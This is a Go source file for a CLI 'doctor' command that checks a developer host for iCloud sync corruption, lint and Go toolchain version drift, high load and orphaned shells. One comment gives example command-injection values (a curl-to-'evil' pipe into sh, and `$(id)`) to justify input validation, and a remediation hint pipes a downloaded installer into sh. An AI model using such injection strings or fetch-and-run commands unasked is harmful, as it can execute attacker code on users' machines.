package main

import (
	"context"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"time"
)

// Host-environment rungs (E83.55 / #4088). Five advisories about the HOST the
// local loop runs on, each a cause of a red verify that has nothing to do with
// the diff: an iCloud-synced checkout, a golangci-lint that differs from the CI
// pin, a Go toolchain that differs from the go.work pin, an overloaded host,
// and busy shells orphaned to pid 1. Every rung here is WARN-ONLY — none
// returns status "fail" — because each is a dev-host heuristic, not a
// precondition the loop cannot run without. A rung that does not apply returns
// ok with a detail beginning "skipped — " (the checkBackendSHADrift
// convention).

// doctorEnvRunOutput runs an external command under a timeout, in dir when dir
// is non-empty, and returns its trimmed stdout AND the error, so a caller can
// still use the output of a command that exited non-zero (`find` reports
// unreadable directories with exit 1 after printing its matches). A missing
// binary surfaces as an error satisfying errors.Is(err, exec.ErrNotFound).
// Test seam in the doctorRunOutput style.
var doctorEnvRunOutput = func(timeout time.Duration, dir, name string, arg ...string) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()
	cmd := exec.CommandContext(ctx, name, arg...) //nolint:gosec // fixed tool names; args are paths doctor resolved
	if dir != "" {
		cmd.Dir = dir
	}
	out, err := cmd.Output()
	return strings.TrimSpace(string(out)), err
}

// The remaining seams: file reads, the home dir, the OS and the core count.
var (
	doctorReadFile    = os.ReadFile
	doctorUserHomeDir = os.UserHomeDir
	doctorGOOS        = runtime.GOOS
	doctorNumCPU      = runtime.NumCPU
)

// doctorConflictScanLimit bounds how many directory entries the conflict-copy
// scan reads in total, so a refs/ tree with a huge number of loose refs cannot
// stall doctor. A var only so the truncation branch is testable.
var doctorConflictScanLimit = 20000

const (
	doctorGitTimeout  = 10 * time.Second
	doctorFindTimeout = 30 * time.Second
	doctorLintTimeout = 10 * time.Second
	doctorGoTimeout   = 30 * time.Second
	doctorPSTimeout   = 5 * time.Second

	// doctorHostLoadFactor mirrors runner/internal/hostload.DefaultFactor
	// (#3663): the load-average-to-core-count ratio above which the runner
	// reclassifies a failed verify as category C host_overloaded. The cli
	// module cannot import runner/internal, so it is duplicated; the parity
	// test TestDoctorHostLoadFactor_MatchesRunnerHostload reads the runner
	// source and fails when the two drift.
	doctorHostLoadFactor = 4.0

	// doctorOrphanMinCPU and doctorOrphanMinAge are the orphaned-shell
	// thresholds: a shell re-parented to pid 1 is reported only when it is
	// BUSY and LONG-LIVED, because on macOS every login item and GUI app is
	// a child of launchd too.
	doctorOrphanMinCPU = 50.0
	doctorOrphanMinAge = 5 * time.Minute

	// doctorOrphanHeuristicNote is carried in every orphaned-shells detail
	// that reports a scan result, so neither "none" nor a hit is read as
	// more than it is.
	doctorOrphanHeuristicNote = "macOS dev-host heuristic: under a subreaper (systemd --user, tmux) orphans re-parent there and are missed, " +
		"and inside a container (pid 1 = the entrypoint) long-running shells it started are reported; 'none' is not proof"
)

// doctorCheckoutRoot resolves the checkout root the host-environment rungs
// inspect. It asks git for the AUTHORITATIVE toplevel (`git rev-parse
// --show-toplevel`) instead of calling resolveRepoRoot, because these rungs
// pair the root with the shared git common dir (doctorGitCommonDir) and only
// git resolves a linked worktree to both correctly: resolveRepoRoot's walk-up
// to the first `.git` entry cannot name the common dir a worktree's `.git`
// FILE points at, and it silently returns the working dir unchanged outside a
// repository. When git cannot answer (not a repository, git absent) the
// absolute working dir is used. Symlinks are resolved best-effort so the
// iCloud folder comparison sees real paths on both sides.
func doctorCheckoutRoot(workingDir string) string {
	root := ""
	if out, err := doctorEnvRunOutput(doctorGitTimeout, workingDir, "git", "rev-parse", "--show-toplevel"); err == nil && filepath.IsAbs(out) {
		root = out
	}
	if root == "" {
		if abs, err := filepath.Abs(workingDir); err == nil {
			root = abs
		} else {
			root = workingDir
		}
	}
	if resolved, err := filepath.EvalSymlinks(root); err == nil {
		root = resolved
	}
	return root
}

// doctorGitCommonDir returns the checkout's shared git directory (the main
// `.git` even from a linked worktree), or "" when git cannot name an existing
// absolute directory, symlinks resolved like the root's. `--path-format=absolute`
// is load-bearing: a bare `--git-common-dir` answers a RELATIVE `.git` (see
// doctor_verify.go).
func doctorGitCommonDir(root string) string {
	out, err := doctorEnvRunOutput(doctorGitTimeout, root, "git", "rev-parse", "--path-format=absolute", "--git-common-dir")
	if err != nil || !filepath.IsAbs(out) {
		return ""
	}
	if fi, statErr := os.Stat(out); statErr != nil || !fi.IsDir() {
		return ""
	}
	if resolved, err := filepath.EvalSymlinks(out); err == nil {
		out = resolved
	}
	return out
}

// ---------------------------------------------------------------------------
// checkout location (iCloud Desktop & Documents sync)
// ---------------------------------------------------------------------------

// iCloudConflictCopyRe matches the name iCloud gives a conflict copy: the
// original stem, a space and a counter, then the original extension
// (`main 2`, `pack-<sha> 2.pack`).
var iCloudConflictCopyRe = regexp.MustCompile(`^(.+) [0-9]+(\.[A-Za-z0-9]+)?$`)

// checkICloudCheckout warns when the checkout is exposed to iCloud Drive's
// Desktop & Documents sync, which evicts file contents (dataless files) and
// writes `* N` conflict copies into .git — both observed corrupting a checkout
// (#4078). Three independent signals; any one warns:
//
//	(a) synced path: the root is under ~/Documents or ~/Desktop AND sync is
//	    detected for that folder (the CloudDocs folder entry is a symlink to it);
//	(b) conflict copies: a `* N` name beside its de-suffixed original in the
//	    root, the git common dir, its objects/pack, or its refs/ tree;
//	(c) dataless files: `find -flags +dataless` over the checkout and objects/pack.
func checkICloudCheckout(workingDir string) checkResult {
	label := "checkout location"
	if doctorGOOS != "darwin" {
		return checkResult{label: label, detail: "skipped — not macOS (iCloud Drive sync is macOS-only)", status: "ok"}
	}
	root := doctorCheckoutRoot(workingDir)
	common := doctorGitCommonDir(root)

	var signals, notes []string

	// (a) synced path. The CloudDocs marker is only consulted when the root is
	// already under one of the two folders, so a checkout elsewhere never
	// touches ~/Library/Mobile Documents.
	inSyncedFolder, iCloudSyncOn, folder := false, false, ""
	if home, err := doctorUserHomeDir(); err == nil {
		for _, name := range []string{"Documents", "Desktop"} {
			if pathWithin(root, filepath.Join(home, name)) {
				inSyncedFolder = true
				folder = "~/" + name
				iCloudSyncOn = iCloudFolderSynced(home, name)
				break
			}
		}
	}
	if inSyncedFolder && iCloudSyncOn {
		signals = append(signals, fmt.Sprintf("the checkout is under %s, which iCloud Desktop & Documents sync mirrors", folder))
	} else if inSyncedFolder {
		notes = append(notes, fmt.Sprintf("under %s but iCloud Desktop & Documents sync not detected", folder))
	}

	// (b) conflict copies.
	scan := &conflictScan{budget: doctorConflictScanLimit}
	scan.dir(root, false)
	if common != "" {
		scan.dir(common, false)
		scan.dir(filepath.Join(common, "objects", "pack"), false)
		scan.dir(filepath.Join(common, "refs"), true)
	}
	if len(scan.found) > 0 {
		signals = append(signals, fmt.Sprintf("%d iCloud conflict cop(ies) beside their originals: %s",
			len(scan.found), examplePaths(scan.found, root)))
	}
	if scan.truncated {
		notes = append(notes, fmt.Sprintf("conflict-copy scan stopped at %d entries", doctorConflictScanLimit))
	}

	// (c) dataless (evicted) files.
	dataless, datalessUnchecked := findDataless(root, common)
	if len(dataless) > 0 {
		signals = append(signals, fmt.Sprintf("%d dataless (iCloud-evicted) file(s): %s",
			len(dataless), examplePaths(dataless, root)))
	}
	if datalessUnchecked != "" {
		notes = append(notes, "could not check for dataless files: "+datalessUnchecked)
	}

	if len(signals) > 0 {
		return checkResult{label: label, detail: strings.Join(append(signals, notes...), "; "), status: "warn",
			remediate: "move the checkout out of the iCloud-synced folder (e.g. ~/Projects/<repo>) after hydrating it " +
				"(`find . -flags +dataless -type f -print0 | xargs -0 cat >/dev/null`) and running `git worktree repair`, " +
				"or turn off iCloud Desktop & Documents sync; remove `* N` copies only after diffing each against its original"}
	}
	detail := root
	if len(notes) > 0 {
		detail += " (" + strings.Join(notes, "; ") + ")"
	}
	return checkResult{label: label, detail: detail, status: "ok"}
}

// pathWithin reports whether child is parent or inside it, with symlinks
// resolved best-effort on both sides. A relative parent (an empty or relative
// $HOME) is never a match: filepath.Rel refuses to relate it to an absolute
// child.
func pathWithin(child, parent string) bool {
	if resolved, err := filepath.EvalSymlinks(parent); err == nil {
		parent = resolved
	}
	if resolved, err := filepath.EvalSymlinks(child); err == nil {
		child = resolved
	}
	rel, err := filepath.Rel(parent, child)
	if err != nil {
		return false
	}
	return rel != ".." && !strings.HasPrefix(rel, ".."+string(filepath.Separator)) && !filepath.IsAbs(rel)
}

// iCloudFolderSynced reports whether iCloud Desktop & Documents sync is on for
// ~/<name>: with sync on, `~/Library/Mobile Documents/com~apple~CloudDocs/<name>`
// is a symlink resolving to the home folder. Observed on the operator host, not
// documented by Apple — so the artifact signals warn independently of it.
//
// Only a symlink can resolve to the home folder, so the resolved-path equality
// is the whole test; a missing marker, a real directory and a link elsewhere
// all fail it. Both resolutions must succeed, or two failures would compare
// "" == "".
func iCloudFolderSynced(home, name string) bool {
	marker := filepath.Join(home, "Library", "Mobile Documents", "com~apple~CloudDocs", name)
	target, err := filepath.EvalSymlinks(marker)
	if err != nil {
		return false
	}
	folder, err := filepath.EvalSymlinks(filepath.Join(home, name))
	if err != nil {
		return false
	}
	return target == folder
}

// conflictScan collects `* N` conflict copies under a shared entry budget.
type conflictScan struct {
	budget    int
	found     []string
	truncated bool
}

// dir scans one directory's entries for conflict copies, flagging a name ONLY
// when its de-suffixed original sits in the same directory — so a tracked
// `Chapter 2.md` is not flagged unless `Chapter.md` exists beside it. With
// recurse it descends into subdirectories (never through symlinks: a
// DirEntry's type comes from Lstat). An unreadable directory contributes
// whatever entries ReadDir returned before failing — usually none.
func (s *conflictScan) dir(dir string, recurse bool) {
	entries, _ := os.ReadDir(dir)
	if len(entries) > s.budget {
		entries = entries[:s.budget]
		s.truncated = true
	}
	s.budget -= len(entries)
	siblings := make(map[string]struct{}, len(entries))
	for _, e := range entries {
		siblings[e.Name()] = struct{}{}
	}
	for _, e := range entries {
		m := iCloudConflictCopyRe.FindStringSubmatch(e.Name())
		if m == nil {
			continue
		}
		original := m[1] + m[2]
		if _, hasOriginal := siblings[original]; hasOriginal {
			s.found = append(s.found, filepath.Join(dir, e.Name()))
		}
	}
	if !recurse {
		return
	}
	for _, e := range entries {
		if e.IsDir() {
			s.dir(filepath.Join(dir, e.Name()), true)
		}
	}
}

// findDataless lists dataless (evicted) regular files in the checkout (pruning
// .git and node_modules) and in the common dir's objects/pack, via macOS
// find(1)'s `-flags` primary. The output is used even when find exits
// non-zero; only an EMPTY output with an error is reported back as unchecked
// (a reason string), never as a signal.
func findDataless(root, common string) (paths []string, unchecked string) {
	var reasons []string
	findInto := func(args ...string) {
		out, err := doctorEnvRunOutput(doctorFindTimeout, "", "find", args...)
		if out != "" {
			paths = append(paths, strings.Split(out, "\n")...)
			return
		}
		if err != nil {
			reasons = append(reasons, err.Error())
		}
	}
	findInto(root, "(", "-path", filepath.Join(root, ".git"), "-o", "-name", "node_modules", ")", "-prune",
		"-o", "-flags", "+dataless", "-type", "f", "-print")
	if common != "" {
		findInto(filepath.Join(common, "objects", "pack"), "-maxdepth", "1", "-flags", "+dataless", "-type", "f", "-print")
	}
	return paths, strings.Join(reasons, "; ")
}

// examplePaths renders up to three paths (relative to root when inside it).
func examplePaths(paths []string, root string) string {
	shown := make([]string, 0, 3)
	for i, p := range paths {
		if i == 3 {
			break
		}
		if rel, err := filepath.Rel(root, p); err == nil && !strings.HasPrefix(rel, "..") {
			p = rel
		}
		shown = append(shown, p)
	}
	out := strings.Join(shown, ", ")
	if len(paths) > len(shown) {
		out += fmt.Sprintf(", … (%d more)", len(paths)-len(shown))
	}
	return out
}

// ---------------------------------------------------------------------------
// golangci-lint pin
// ---------------------------------------------------------------------------

// golangciVersionRe parses `golangci-lint version` output; some builds print a
// `v` prefix.
var golangciVersionRe = regexp.MustCompile(`has version v?([0-9]+\.[0-9]+\.[0-9]+)`)

// gateImageDockerfile is the checkout-relative pin site both pin rungs read.
// scripts/check-gate-image holds its ARGs equal to every CI pin site.
var gateImageDockerfile = filepath.Join("deploy", "gate-image", "Dockerfile")

// dockerfileArgDefault returns the default of the first NON-comment
// `ARG <name>=<value>` line (quotes stripped), or "" — the same parse as
// scripts/check-gate-image's arg_default. The line anchor (optional
// indentation, then ARG) is what excludes a `# ARG ...` comment.
func dockerfileArgDefault(data []byte, name string) string {
	prefix := regexp.MustCompile(`^[ \t]*ARG[ \t]+` + regexp.QuoteMeta(name) + `=`)
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSuffix(line, "\r")
		loc := prefix.FindStringIndex(line)
		if loc == nil {
			continue
		}
		v := line[loc[1]:]
		if i := strings.IndexAny(v, " \t"); i >= 0 {
			v = v[:i]
		}
		return strings.Trim(v, `"'`)
	}
	return ""
}

// dockerfilePinRe is the shape a Dockerfile-derived pin must have (after its
// `v` / `go` prefix is trimmed) before it is formatted into a copy-pasteable
// remedy command. The checkout is untrusted input — doctor is run against a
// repository the operator has just cloned — and dockerfileArgDefault stops
// only at whitespace, so an ARG such as `v2.8.0;curl${IFS}evil|sh` or
// `1.25.6$(id)` would otherwise become shell in the `hint:` line.
var dockerfilePinRe = regexp.MustCompile(`^[0-9]+\.[0-9]+(\.[0-9]+)?$`)

// checkGolangciLintPin warns when the local golangci-lint differs from the CI
// pin: in-loop lint can then pass while CI's gofmt/lint goes red.
func checkGolangciLintPin(workingDir string) checkResult {
	label := "golangci-lint pin"
	root := doctorCheckoutRoot(workingDir)
	data, err := doctorReadFile(filepath.Join(root, gateImageDockerfile))
	pin := ""
	if err == nil {
		pin = dockerfileArgDefault(data, "GOLANGCI_LINT_VERSION")
	}
	if pin == "" {
		return checkResult{label: label, detail: "skipped — no golangci-lint pin in this checkout", status: "ok"}
	}
	pinnedLintVersion := strings.TrimPrefix(pin, "v")
	if !dockerfilePinRe.MatchString(pinnedLintVersion) {
		return checkResult{label: label, status: "ok",
			detail: "skipped — golangci-lint pin unparseable (" + filepath.ToSlash(gateImageDockerfile) + " ARG GOLANGCI_LINT_VERSION is not vX.Y[.Z])"}
	}
	installHint := fmt.Sprintf("install the pinned version (`curl -sSfL https://raw.githubusercontent.com/golangci/golangci-lint/v%[1]s/install.sh | "+
		"sh -s -- -b \"$(go env GOPATH)/bin\" v%[1]s`) or run `scripts/test lint --in-gate-image` for CI parity", pinnedLintVersion)

	out, err := doctorEnvRunOutput(doctorLintTimeout, root, "golangci-lint", "version")
	if errors.Is(err, exec.ErrNotFound) {
		return checkResult{label: label, detail: fmt.Sprintf("not on PATH (CI pin v%s)", pinnedLintVersion), status: "warn",
			remediate: installHint}
	}
	m := golangciVersionRe.FindStringSubmatch(out)
	if m == nil {
		detail := fmt.Sprintf("version unparseable (CI pin v%s)", pinnedLintVersion)
		if err != nil {
			detail += ": " + err.Error()
		}
		return checkResult{label: label, detail: detail, status: "warn", remediate: installHint}
	}
	localLintVersion := m[1]
	if localLintVersion != pinnedLintVersion {
		return checkResult{label: label,
			detail: fmt.Sprintf("local v%s, CI pin v%s", localLintVersion, pinnedLintVersion), status: "warn",
			remediate: "in-loop lint can pass while CI's gofmt/lint goes red — " + installHint}
	}
	return checkResult{label: label, detail: fmt.Sprintf("v%s (matches CI pin)", localLintVersion), status: "ok"}
}

// ---------------------------------------------------------------------------
// go toolchain pin
// ---------------------------------------------------------------------------

// goDirectiveRe matches a column-0 `go X.Y[.Z]` directive in go.work / go.mod.
var goDirectiveRe = regexp.MustCompile(`(?m)^go[ \t]+([0-9]+)\.([0-9]+)(\.[0-9]+)?[ \t\r]*(?://.*)?$`)

// goVersionRe parses `go version` output.
var goVersionRe = regexp.MustCompile(`go version go([0-9]+)\.([0-9]+)(\.[0-9]+)?`)

// compareGoMajorMinor orders two Go MAJOR.MINOR pairs.
func compareGoMajorMinor(local, pinned [2]int) int {
	switch {
	case local[0] > pinned[0] || (local[0] == pinned[0] && local[1] > pinned[1]):
		return 1 // local newer than the pin
	case local[0] < pinned[0] || (local[0] == pinned[0] && local[1] < pinned[1]):
		return -1 // local older than the pin
	}
	return 0
}

// checkGoToolchainPin warns when the Go toolchain the checkout selects differs
// in MAJOR.MINOR from its go.work (else go.mod) `go` directive — the AGENTS.md
// #3237 trap, where a newer local Go reddens verify on clean main while CI
// stays green.
func checkGoToolchainPin(workingDir string) checkResult {
	label := "go toolchain pin"
	root := doctorCheckoutRoot(workingDir)
	var directive []string
	source := ""
	for _, name := range []string{"go.work", "go.mod"} {
		data, err := doctorReadFile(filepath.Join(root, name))
		if err != nil {
			continue
		}
		if m := goDirectiveRe.FindStringSubmatch(string(data)); m != nil {
			directive, source = m, name
			break
		}
	}
	if directive == nil {
		return checkResult{label: label, detail: "skipped — no go.work or go.mod at the checkout root", status: "ok"}
	}
	pinMajor, _ := strconv.Atoi(directive[1])
	pinMinor, _ := strconv.Atoi(directive[2])
	pinText := directive[1] + "." + directive[2] + directive[3]

	// The toolchain to recommend: the gate image's exact GO_VERSION when the
	// checkout carries a version-shaped one (dockerfilePinRe), else the
	// directive (with .0 appended so `go 1.25` yields the valid GOTOOLCHAIN
	// value go1.25.0) — the directive is already digit-constrained by
	// goDirectiveRe.
	toolchain := ""
	hasGateImage := false
	if data, err := doctorReadFile(filepath.Join(root, gateImageDockerfile)); err == nil {
		if v := strings.TrimPrefix(dockerfileArgDefault(data, "GO_VERSION"), "go"); dockerfilePinRe.MatchString(v) {
			toolchain = v
		}
		hasGateImage = true
	}
	if toolchain == "" {
		toolchain = pinText
		if directive[3] == "" {
			toolchain += ".0"
		}
	}

	out, err := doctorEnvRunOutput(doctorGoTimeout, root, "go", "version")
	if errors.Is(err, exec.ErrNotFound) {
		return checkResult{label: label, detail: fmt.Sprintf("go not on PATH (%s pin go %s)", source, pinText), status: "warn",
			remediate: fmt.Sprintf("install Go %s (https://go.dev/dl/) and put it on PATH", toolchain)}
	}
	m := goVersionRe.FindStringSubmatch(out)
	if m == nil {
		detail := fmt.Sprintf("`go version` unparseable (%s pin go %s)", source, pinText)
		if err != nil {
			detail += ": " + err.Error()
		}
		return checkResult{label: label, detail: detail, status: "warn",
			remediate: fmt.Sprintf("run `go version` in the checkout; pin the toolchain with `go env -w GOTOOLCHAIN=go%s`", toolchain)}
	}
	localMajor, _ := strconv.Atoi(m[1])
	localMinor, _ := strconv.Atoi(m[2])
	localText := "go" + m[1] + "." + m[2] + m[3]

	switch compareGoMajorMinor([2]int{localMajor, localMinor}, [2]int{pinMajor, pinMinor}) {
	case 1:
		remedy := fmt.Sprintf("a newer Go can red-line `scripts/test verify` on clean main while CI stays green (the jsonv2 encoder case, #3237): "+
			"pin it with `go env -w GOTOOLCHAIN=go%s`", toolchain)
		if hasGateImage {
			remedy += ", or run `scripts/test lint --in-gate-image` for CI parity"
		}
		return checkResult{label: label, detail: fmt.Sprintf("local %s newer than the %s pin go %s", localText, source, pinText),
			status: "warn", remediate: remedy}
	case -1:
		return checkResult{label: label, detail: fmt.Sprintf("local %s older than the %s pin go %s", localText, source, pinText),
			status:    "warn",
			remediate: fmt.Sprintf("upgrade Go to go%s, or unset GOTOOLCHAIN=local (`go env -u GOTOOLCHAIN`) so the go command fetches the pinned toolchain", toolchain)}
	}
	return checkResult{label: label, detail: fmt.Sprintf("%s (%s pin go %s)", localText, source, pinText), status: "ok"}
}

// ---------------------------------------------------------------------------
// host load
// ---------------------------------------------------------------------------

// doctorUptimeLoadRe tolerates Linux's "load average:" and macOS's "load
// averages:" (the runner/internal/hostload regex).
var doctorUptimeLoadRe = regexp.MustCompile(`load averages?:\s*([0-9]+(?:[.,][0-9]+)?)`)

// doctorReadLoad1 reads the 1-minute load average from /proc/loadavg, then
// `sysctl -n vm.loadavg`, then `uptime` — the same three-source ladder as
// runner/internal/hostload, duplicated because the cli module cannot import
// runner/internal.
func doctorReadLoad1() (float64, bool) {
	if b, err := doctorReadFile("/proc/loadavg"); err == nil {
		if fields := strings.Fields(string(b)); len(fields) > 0 {
			if v, perr := strconv.ParseFloat(fields[0], 64); perr == nil {
				return v, true
			}
		}
	}
	if out, err := doctorEnvRunOutput(doctorPSTimeout, "", "sysctl", "-n", "vm.loadavg"); err == nil {
		if fields := strings.Fields(strings.Trim(out, "{} ")); len(fields) > 0 {
			if v, perr := strconv.ParseFloat(fields[0], 64); perr == nil {
				return v, true
			}
		}
	}
	if out, err := doctorEnvRunOutput(doctorPSTimeout, "", "uptime"); err == nil {
		if m := doctorUptimeLoadRe.FindStringSubmatch(out); len(m) == 2 {
			if v, perr := strconv.ParseFloat(strings.Replace(m[1], ",", ".", 1), 64); perr == nil {
				return v, true
			}
		}
	}
	return 0, false
}

// doctorCPUConsumer is one `ps` row for the top-consumers list.
type doctorCPUConsumer struct {
	pid  int
	pcpu float64
	comm string
}

// doctorTopConsumers returns the n highest-%CPU processes, sorted in Go (BSD
// and procps disagree on ps sort flags). Best-effort: a failed ps prints no
// rows, so it yields nil.
func doctorTopConsumers(n int) []doctorCPUConsumer {
	out, _ := doctorEnvRunOutput(doctorPSTimeout, "", "ps", "-axo", "pid=,pcpu=,comm=")
	var all []doctorCPUConsumer
	for _, line := range strings.Split(out, "\n") {
		fields := strings.Fields(line)
		if len(fields) < 3 {
			continue
		}
		pid, err1 := strconv.Atoi(fields[0])
		pcpu, err2 := strconv.ParseFloat(fields[1], 64)
		if err1 != nil || err2 != nil {
			continue
		}
		all = append(all, doctorCPUConsumer{pid: pid, pcpu: pcpu, comm: strings.Join(fields[2:], " ")})
	}
	sort.SliceStable(all, func(i, j int) bool { return all[i].pcpu > all[j].pcpu })
	if len(all) > n {
		all = all[:n]
	}
	return all
}

// checkHostLoad warns when the 1-minute load average exceeds the runner's
// starvation factor times the core count: a verify run now fails on timeouts
// in packages the diff never touched (#3663).
func checkHostLoad() checkResult {
	label := "host load"
	load1, ok := doctorReadLoad1()
	if !ok {
		return checkResult{label: label, detail: "skipped — no readable load average", status: "ok"}
	}
	cores := doctorNumCPU()
	if cores <= 0 {
		return checkResult{label: label, detail: fmt.Sprintf("load %.2f (core count unavailable, not judged)", load1), status: "ok"}
	}
	ratio := load1 / float64(cores)
	if load1 > doctorHostLoadFactor*float64(cores) {
		detail := fmt.Sprintf("1-min load %.2f on %d cores (%.1fx, threshold %.1fx)", load1, cores, ratio, doctorHostLoadFactor)
		if top := doctorTopConsumers(3); len(top) > 0 {
			parts := make([]string, 0, len(top))
			for _, c := range top {
				parts = append(parts, fmt.Sprintf("pid %d %s %.1f%%", c.pid, c.comm, c.pcpu))
			}
			detail += "; top CPU: " + strings.Join(parts, ", ")
		}
		return checkResult{label: label, detail: detail, status: "warn",
			remediate: "a verify run now fails on timeouts in packages the diff never touched — find and stop the consumers " +
				"(see the `orphaned shells` rung) and re-run `fishhawk doctor` before dispatching"}
	}
	return checkResult{label: label, detail: fmt.Sprintf("load %.2f on %d cores (%.1fx)", load1, cores, ratio), status: "ok"}
}

// ---------------------------------------------------------------------------
// orphaned shells
// ---------------------------------------------------------------------------

// doctorProc is one `ps` row for the orphaned-shell scan.
type doctorProc struct {
	pid     int
	ppid    int
	pcpu    float64
	etime   string
	elapsed time.Duration
	comm    string
}

// parseEtime parses ps's `[[dd-]hh:]mm:ss` elapsed time.
func parseEtime(s string) (time.Duration, bool) {
	days := 0
	if d, rest, found := strings.Cut(s, "-"); found {
		n, err := strconv.Atoi(d) // Cut at the first '-' leaves no sign to parse
		if err != nil {
			return 0, false
		}
		days, s = n, rest
	}
	parts := strings.Split(s, ":")
	if len(parts) < 2 || len(parts) > 3 {
		return 0, false
	}
	nums := make([]int, len(parts))
	for i, p := range parts {
		n, err := strconv.Atoi(p)
		if err != nil || n < 0 {
			return 0, false
		}
		nums[i] = n
	}
	var h, m, sec int
	if len(nums) == 3 {
		h, m, sec = nums[0], nums[1], nums[2]
	} else {
		m, sec = nums[0], nums[1]
	}
	return time.Duration(days)*24*time.Hour + time.Duration(h)*time.Hour +
		time.Duration(m)*time.Minute + time.Duration(sec)*time.Second, true
}

// isShellComm reports whether a ps comm (a path or a login-shell `-zsh`) names
// a POSIX shell.
func isShellComm(comm string) bool {
	switch strings.TrimPrefix(filepath.Base(comm), "-") {
	case "sh", "bash", "zsh", "dash", "ksh":
		return true
	}
	return false
}

// parseDoctorProcs parses `ps -axo pid=,ppid=,pcpu=,etime=,comm=` output; comm
// is the remaining fields joined, so a path with spaces survives.
func parseDoctorProcs(out string) []doctorProc {
	var procs []doctorProc
	for _, line := range strings.Split(out, "\n") {
		fields := strings.Fields(line)
		if len(fields) < 5 {
			continue
		}
		pid, err1 := strconv.Atoi(fields[0])
		ppid, err2 := strconv.Atoi(fields[1])
		pcpu, err3 := strconv.ParseFloat(fields[2], 64)
		elapsed, ok := parseEtime(fields[3])
		if err1 != nil || err2 != nil || err3 != nil || !ok {
			continue
		}
		procs = append(procs, doctorProc{pid: pid, ppid: ppid, pcpu: pcpu, etime: fields[3], elapsed: elapsed,
			comm: strings.Join(fields[4:], " ")})
	}
	return procs
}

// checkOrphanedShells warns on busy, long-lived shells re-parented to pid 1:
// they sit outside every run's process tree, so the runner's stage-exit sweep
// cannot reach them, and they starve every later verify on the host (#3663).
func checkOrphanedShells() checkResult {
	label := "orphaned shells"
	out, err := doctorEnvRunOutput(doctorPSTimeout, "", "ps", "-axo", "pid=,ppid=,pcpu=,etime=,comm=")
	if err != nil {
		return checkResult{label: label, detail: "skipped — ps unavailable: " + err.Error(), status: "ok"}
	}
	procs := parseDoctorProcs(out)
	if len(procs) == 0 {
		return checkResult{label: label, detail: "skipped — ps unavailable: no parseable rows", status: "ok"}
	}
	var orphans []doctorProc
	for _, proc := range procs {
		if proc.ppid != 1 || !isShellComm(proc.comm) {
			continue
		}
		if proc.pcpu < doctorOrphanMinCPU || proc.elapsed < doctorOrphanMinAge {
			continue
		}
		orphans = append(orphans, proc)
	}
	if len(orphans) == 0 {
		return checkResult{label: label, detail: "none (" + doctorOrphanHeuristicNote + ")", status: "ok"}
	}
	shown := make([]string, 0, 5)
	pids := make([]string, 0, len(orphans))
	for i, p := range orphans {
		pids = append(pids, strconv.Itoa(p.pid))
		if i < 5 {
			shown = append(shown, fmt.Sprintf("pid %d %s %.1f%% up %s",
				p.pid, strings.TrimPrefix(filepath.Base(p.comm), "-"), p.pcpu, p.etime))
		}
	}
	detail := fmt.Sprintf("%d busy shell(s) re-parented to pid 1: %s", len(orphans), strings.Join(shown, ", "))
	if len(orphans) > len(shown) {
		detail += fmt.Sprintf(", … (%d more)", len(orphans)-len(shown))
	}
	detail += " (" + doctorOrphanHeuristicNote + ")"
	return checkResult{label: label, detail: detail, status: "warn",
		remediate: "a shell re-parented to pid 1 sits outside every run's process tree, so the runner's stage-exit sweep cannot reach it " +
			"and it starves later verifies — confirm no live run owns it (`pgrep -fl 'fishhawk-runner --run-id'`) then `kill " +
			strings.Join(pids, " ") + "`"}
}
